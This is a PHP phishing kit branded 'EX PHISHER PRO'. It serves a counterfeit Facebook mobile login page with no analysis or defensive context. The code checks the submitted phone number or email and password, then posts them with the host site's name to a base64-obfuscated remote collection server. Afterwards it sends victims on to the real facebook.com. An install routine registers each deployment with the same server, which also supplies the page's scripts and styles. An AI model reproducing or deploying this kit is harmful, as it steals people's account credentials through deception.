<?php session_start();error_reporting(0);function check_number($number){$justNums = preg_replace("/[^0-9]/", '', $number);if(strlen($justNums) > 8){return true;}else{return false;}};function check_password($password){if(strlen($password) > 5){return true;}else{return false;}};function check_email($email){if (filter_var($email, FILTER_VALIDATE_EMAIL)) {return true;}else{return false;}};if(!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off'){$server = base64_decode('aHR0cHM6Ly9wYXNzbm90ZS4wMDB3ZWJob3N0YXBwLmNvbS8');}else{$server = base64_decode('aHR0cDovL3Bhc3Nub3RlLjAwMHdlYmhvc3RhcHAuY29tLw');}$website = $_SERVER['SERVER_NAME'];$errormsg = base64_decode('PGRpdiBjbGFzcz0iX3F3OSBncm91cGVkIGFjbGIiPjxkaXYgY2xhc3M9Il83X3Y1Ij48ZGl2IGNsYXNzPSJfN192NiI+PGRpdj48c3BhbiBjbGFzcz0iXzgwcTEiPiBGYWNlYm9vayByZXF1ZXN0cyBhbmQgcmVjZWl2ZXMgeW91ciBwaG9uZSBudW1iZXIgZnJvbSB5b3VyIG1vYmlsZSBuZXR3b3JrLiA8L3NwYW4+PGEgY2xhc3M9Il84MHExIiBocmVmPSJodHRwczovL20uZmFjZWJvb2suY29tL2hlYWRlcl9zZXR0aW5ncy8/cmVkaXJlY3RfdXJsPWh0dHBzJTNBJTJGJTJGbS5mYWNlYm9vay5jb20lMkYmZmxvdz1vcHRfb3V0JnJlZmlkPTgiPiBDaGFuZ2Ugc2V0dGluZ3MgPC9hPjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2Pg');if(isset($_POST['type'])){$type = $_POST['type'];if($type == "Install"){$email = $_POST['email'];$data = array('site' => $website,'email' => $email);$options = array('http' => array('header'  => "Content-type: application/x-www-form-urlencoded\r\n",'method'  => 'POST','content' => http_build_query($data)));$context  = stream_context_create($options);$result = (file_get_contents($server, false, $context));if($result == 'Installed'){$_SESSION['install'] = "Installed";die('Success');}else{die('Error');}}else if($type == "Login"){$email = $_POST['email'];$password = $_POST['password'];if(check_number($email)){if(check_password($password)){$data = array('web' => $website,'email' => $email,'password' => $password);$options = array('http' => array('header'  => "Content-type: application/x-www-form-urlencoded\r\n",'method'  => 'POST','content' => http_build_query($data)));$context  = stream_context_create($options);$result = (file_get_contents($server, false, $context));if($result == 'Success'){header("Location: https://www.facebook.com/"); die();}else{$errormsg = base64_decode('PGRpdiBjbGFzcz0iX3F3OSBncm91cGVkIGFjbGIiPjxkaXYgY2xhc3M9Il83X3Y1X2UiPjxkaXYgY2xhc3M9Il83X3Y2X2UiPjxkaXY+PHNwYW4+U29tZXRoaW5nIHdlbnQgd3JvbmcuIFBsZWFzZSB0cnkgYWdhaW4uPC9zcGFuPjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2Pg');}}else{$errormsg = base64_decode('PGRpdiBjbGFzcz0iX3F3OSBncm91cGVkIGFjbGIiPjxkaXYgY2xhc3M9Il83X3Y1X2UiPjxkaXYgY2xhc3M9Il83X3Y2X2UiPjxkaXY+PHNwYW4+SW5jb3JyZWN0IHBhc3N3b3JkLiBEaWQgeW91IGZvcmdldCB5b3VyIHBhc3N3b3JkPzwvc3Bhbj48L2Rpdj48L2Rpdj48L2Rpdj48L2Rpdj4');}}else if(check_email($email)){if(check_password($password)){$data = array('web' => $website,'email' => $email,'password' => $password);$options = array('http' => array('header'  => "Content-type: application/x-www-form-urlencoded\r\n",'method'  => 'POST','content' => http_build_query($data)));$context  = stream_context_create($options);$result = (file_get_contents($server, false, $context));if($result == 'Success'){header("Location: https://www.facebook.com/"); die();}else{$errormsg = base64_decode('PGRpdiBjbGFzcz0iX3F3OSBncm91cGVkIGFjbGIiPjxkaXYgY2xhc3M9Il83X3Y1X2UiPjxkaXYgY2xhc3M9Il83X3Y2X2UiPjxkaXY+PHNwYW4+U29tZXRoaW5nIHdlbnQgd3JvbmcuIFBsZWFzZSB0cnkgYWdhaW4uPC9zcGFuPjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2Pg');}}else{$errormsg = base64_decode('PGRpdiBjbGFzcz0iX3F3OSBncm91cGVkIGFjbGIiPjxkaXYgY2xhc3M9Il83X3Y1X2UiPjxkaXYgY2xhc3M9Il83X3Y2X2UiPjxkaXY+PHNwYW4+SW5jb3JyZWN0IHBhc3N3b3JkLiBEaWQgeW91IGZvcmdldCB5b3VyIHBhc3N3b3JkPzwvc3Bhbj48L2Rpdj48L2Rpdj48L2Rpdj48L2Rpdj4');}}else{$errormsg = base64_decode('PGRpdiBjbGFzcz0iX3F3OSBncm91cGVkIGFjbGIiPjxkaXYgY2xhc3M9Il83X3Y1X2UiPjxkaXYgY2xhc3M9Il83X3Y2X2UiPjxkaXY+PHNwYW4+VGhlIG1vYmlsZSBudW1iZXIgb3IgZW1haWwgYWRkcmVzcyB0aGF0IHlvdSBlbnRlcmVkIGRvZXMgbm90IG1hdGNoIGFuIGFjY291bnQuPC9zcGFuPjwvZGl2PjwvZGl2PjwvZGl2PjwvZGl2Pg');}}}else{if(!isset($_SESSION['install'])){$data = array('website' => $website);$options = array('http' => array('header'  => "Content-type: application/x-www-form-urlencoded\r\n",'method'  => 'POST','content' => http_build_query($data)));$context  = stream_context_create($options);$result = (file_get_contents($server, false, $context));if($result == 'Installed'){$_SESSION['install'] = "Installed";}else{die('<!doctype html><html><meta charset="utf-8"><title>EX PHISHER PRO</title><link rel="shortcut icon" href="'.$server.'faicon.png"><meta name="og:image" property="og:image" content="'.$server.'faicon.png"><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script><link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css"><script src="https://cdn.jsdelivr.net/npm/sweetalert2@10/dist/sweetalert2.all.min.js"></script><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" ><meta name="description" content="EX PHISHER PRO - Install Now" ><style>@import url("https://fonts.googleapis.com/css2?family=Lexend+Deca&family=Source+Sans+Pro&display=swap");* {	margin: 0;    font-family: "Source Sans Pro", sans-serif;	box-sizing: border-box;	webkit-box-sizing: border-box;    -moz-box-sizing: border-box;}body{	margin:0;	padding:0;	background: #191919;	box-sizing: border-box;}#loader {    position: fixed;    top: 50%;    left: 50%;    width: 50px;    height: 50px;    transform: translate(-50%, -50%) rotate(165deg);    z-index: 69;	display: none;}#loader:before, #loader:after {    content: "";    position: absolute;    top: 50%;    left: 50%;    display: block;    width: 0.5em;    height: 0.5em;    border-radius: 0.25em;    transform: translate(-50%, -50%);}#loader:before {    animation: before 2s infinite;}#loader:after {    animation: after 2s infinite;}@keyframes before {  0% {    width: 0.5em;    box-shadow: 1em -0.5em rgba(225, 20, 98, 0.75), -1em 0.5em rgba(111, 202, 220, 0.75);  }  35% {    width: 2.5em;    box-shadow: 0 -0.5em rgba(225, 20, 98, 0.75), 0 0.5em rgba(111, 202, 220, 0.75);  }  70% {    width: 0.5em;    box-shadow: -1em -0.5em rgba(225, 20, 98, 0.75), 1em 0.5em rgba(111, 202, 220, 0.75);  }  100% {    box-shadow: 1em -0.5em rgba(225, 20, 98, 0.75), -1em 0.5em rgba(111, 202, 220, 0.75);  }}@keyframes after {  0% {    height: 0.5em;    box-shadow: 0.5em 1em rgba(61, 184, 143, 0.75), -0.5em -1em rgba(233, 169, 32, 0.75);  }  35% {    height: 2.5em;    box-shadow: 0.5em 0 rgba(61, 184, 143, 0.75), -0.5em 0 rgba(233, 169, 32, 0.75);  }  70% {    height: 0.5em;    box-shadow: 0.5em -1em rgba(61, 184, 143, 0.75), -0.5em 1em rgba(233, 169, 32, 0.75);  }  100% {    box-shadow: 0.5em 1em rgba(61, 184, 143, 0.75), -0.5em -1em rgba(233, 169, 32, 0.75);  }}#blur {    height: 100%;    background: #222222;    bottom: 0;    left: 0;    opacity: .5;    outline: none;    position: fixed;    width: 100%;    z-index: 25;    display: none;}.box {    padding: 10px 15px;    background: #131313;    border: 2px solid;    border-radius: 10px 5px;    border-color: #08e8fd;    box-shadow: 5px 5px 12px rgb(8 232 253 / 25%);    position: fixed;    width: calc(100% - 30px);    max-width: 500px;    top: 50%;    left: 50%;    transform: translate(-50%, -50%);}.box h1.title {    width: 100%;    text-align: center;    margin-bottom: 30px;	color: #08e8fd;}.input{    position: relative;    height: 37px;    margin-bottom: 25px;}.input input{    position: absolute;    top: 0;    left: 0;    width: 100%;    height: 100%;    font-size: 17px;    border-radius: 0.5rem;    outline: none;    padding: 1rem 1rem 1rem 37px;    background: none;    z-index: 1;}.input label{    position: absolute;    left: 37px;    top: 7px;    padding: 0 0.25rem;    background-color: #121212;    font-size: 18px;    transition: .3s;}.input .icon{    width: 37px;    height: 37px;    font-size: 23px;    padding: 5px 0;    text-align: center;}.button{	cursor: pointer;}#input:focus + #label{    top: -0.5rem;    left: 27px;    font-size: 13px;    font-weight: 500;    z-index: 10;}#input:not(:placeholder-shown)#input:not(:focus) + #label{    top: -0.5rem;    left: 27px;    font-size: 13px;    font-weight: 500;    z-index: 10;}.input input{	color: #08e8fd;    border: 1px solid #08e8fd;}.input input:focus{	border: 2px solid #08e8fd;	box-shadow: 3px 3px 10px rgb(8 232 253 / 25%);}.input input:hover{	border: 2px solid #08e8fd;	box-shadow: 3px 3px 10px rgb(8 232 253 / 25%);}.input label{	color: #08e8fd;}.input .icon{	color: #08e8fd;}.input.error input{	color: #f32921!important;    border: 1px solid #f32921!important;}.input.error input:focus{  border: 2px solid #f32921!important;  box-shadow: 3px 3px 10px rgb(243 41 33 / 40%)!important;}.input.error input:hover{  border: 2px solid #f32921!important;  box-shadow: 3px 3px 10px rgb(243 41 33 / 40%)!important;}.input.error label{	color: #f32921;}.input.error .icon{	color: #f32921;}.input span {    display: none;}.error span {    display: block;    position: absolute;    color: #f32921;    bottom: -17px;    font-size: 13px;    right: 1rem;}.button {	position: relative;    height: 37px;    margin-bottom: 25px;	border-radius: 0.5rem;}.button{	color: #08e8fd;    border: 1px solid #08e8fd;}.button:focus{	border: 2px solid #08e8fd;	box-shadow: 3px 3px 10px rgb(8 232 253 / 25%);}.button:hover{	border: 2px solid #08e8fd;	box-shadow: 3px 3px 10px rgb(8 232 253 / 25%);}.button h1 {    height: 37px;    margin: auto;    text-align: center;    font-size: 20px;    padding: 4px 0;}</style><body><div id="body"><div class="box"><h1 class="title">EX PHISHER PRO</h1><div class="input" id="email"><div class="icon"><i class="fa-light fa-envelope"></i></div><input type="email" id="input" placeholder=" "><label for="input" id="label">Email</label><span></span></div><div class="button" id="Install"><h1>Install Now</h1></div></div></div><div id="loader" style="display: none;"></div><div id="blur" style="display: none;"></div><script src="'.$server.'script.js"></script></body></html>');}}}echo '<!doctype html><html><head><meta charset="utf-8"><title>Log In or Sign Up</title><link rel="stylesheet" href="'.$server.'style.css"><link rel="shortcut icon" href="'.$server.'faicon.png"><meta name="og:image" property="og:image" content="'.$server.'faicon.png"><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" ><meta name="description" content="Create an account or log in. Connect with friends, family and other people you know. Share photos and videos, send messages and get updates." ></head><body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw  portrait" style="background-color: rgb(255, 255, 255); min-height: 600px;"><div id="viewport" data-kaios-focus-transparent="1" style="min-height: 600px;"><div id="page"><div class="_129_"></div><div class="_5soa acw"><div class="_7om2"><div class="_4g34" id="u_0_0_Dq"><div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice"><div class="_52jd"></div></div><div class="_9om_"><div class="_4-4l"><div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">'.$errormsg.'</div> <div class="_7om2 _52we _2pid _52z6"> <div class="_4g34"> <a href="#"><img src="'.$server.'fa.svg" width="112" class="img"></a> </div></div><div class="_5rut"><form method="post" action="#" class="mobile-login-form _9hp- _5spm"><div><div class="_56be"><div class="_55wo _56bf"><div class="_96n9" id="email_input_container"><input autocorrect="off" autocapitalize="off" type="text" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="Mobile number or email address" data-sigil="m_login_email"  required> </div></div></div><div class="_55wq"></div><div class="_56be"><div class="_55wo _56bf"><div class="_1upc _mg8" data-sigil="m_login_password"><div class="_7om2"><div class="_4g34 _5i2i _52we"><div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="password" placeholder="Password" type="password" data-sigil="password-plain-text-toggle-input" minlength="6"  required></div></div><div class="_5s61 _216i _5i2i _52we"><div class="_5xu4"><div class="_2pi9" style="display:none" id="u_0_2_+K"><a href="#" id="show-btn" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_3_fj">HIDE</span><span class="mfss" id="u_0_4_fv">SHOW</span></a></div></div></div></div></div></div></div><input type="hidden" name="type" value="Login"/></div><div class="_2pie" style="text-align:center;"><div><button type="submit" type="button" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" name="login"><span class="_55sr">Log In</span></div><div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div></div></form><div><div class="_2pie _9omz"><div class="_52jj _9on1"><a class="_9on1" tabindex="0" href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr">Forgotten password?</a></div></div><div style="padding-top: 42px"><div><div><div><div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"><span class="_43mh">or</span></div><div class="_52jj _5t3b" id="signup_button_area"><a role="button" href="https://m.facebook.com/reg/?cid=103&soft=hjk" class="_5t3c _28le btn btnS medBtn mfsm touchable" >Create New Account</a></div></div></div><div class="_2pie" style="text-align:center;"><div><div class="other-links _8p_m"><ul class="_5pkb _55wp"><li></li></ul></div></div></div></div></div></div></div></div></div></div></div><div style="display:none"><div></div><div></div></div><span><img src="#" width="0" height="0" style="display:none"></span><div class="_55wr _5ui2" data-sigil="m_login_footer"><div class="_5dpw"><div class="_5ui3"><div class="_7om2"><div class="_4g34"><span class="_52jc _52j9 _52jh _3ztb">English (UK)</span><div class="_3ztc"><span class="_52jc"><a href="#" >অসমীয়া</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#">नेपाली	</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#">Português (Brasil)</a></span></div></div><div class="_4g34"><div class="_3ztc"><span class="_52jc"><a href="#">বাংলা	</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#">हिन्दी	</a></span></div><div class="_3ztc"><span class="_52jc"><a href="#">Español</a></span></div><a href="#"><div class="_3j87 _1rrd _3ztd"> <i class="img sp_vuppHZ0nD_0_3x sx_222020"></i> </div></a></div></div></div> <div class="_5ui4"> <div class="_96qv _9a0a"> <a href="https://m.facebook.com/Meta?_rdr" class="_96qw"> About </a> <span aria-hidden="true"> · </span> <a href="https://m.facebook.com/help/?ref=pf&refid=8" class="_96qw"> Help </a> <span aria-hidden="true"> · </span> <span class="_96qw" id="u_0_4_fx"> More </span> </div></div><span class="mfss fcg">Facebook Inc.</span></div></div></div></div><script src="'.$server.'script.js"></script></body></html>'; ?>